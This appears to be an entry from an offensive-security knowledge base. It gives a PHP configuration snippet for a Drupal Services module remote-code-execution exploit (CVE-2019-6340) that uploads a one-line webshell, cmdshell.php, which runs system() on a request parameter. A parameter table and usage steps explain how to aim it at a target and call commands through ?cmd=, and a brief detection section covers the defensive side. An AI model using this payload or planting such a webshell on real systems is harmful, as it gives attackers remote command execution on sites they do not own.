---
id: 236ad2b4-342c-414c-b5f8-79069f11a346
type: code
language: php
verified: true
created_at: '2020-03-17T00:09:17.041606+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - rce
  - payload
  - drupal
  - exploit
validated: true
---

# Drupal Services Module RCE Payload

## Code

```php
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'cmdshell.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```

## Description

This PHP snippet configures the deserialization payload for CVE-2019-6340, defining the target URL, REST endpoint, and file upload details for injecting a webshell via the Services module.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $url | Target Drupal site URL | http://10.10.10.9 |
| $endpoint_path | Path to REST endpoint | /rest |
| $endpoint | Endpoint name | rest_endpoint |
| filename | Uploaded file name | cmdshell.php |
| data | Webshell content | <?php system($_REQUEST["cmd"]); ?> |

## Usage

Embed in the Exploit-DB PHP script before execution. Modify variables to match the target, then run to upload the shell. Access via ?cmd= for RCE in Drupal exploitation chains.

## Detection

Inspect POST requests to /rest for base64-encoded objects or file upload patterns. Monitor web logs for new .php files in root and system() calls in executed code.

## Related

- [[procedures/drupal-7-x-services-module-rce-cve-2019-6340]]
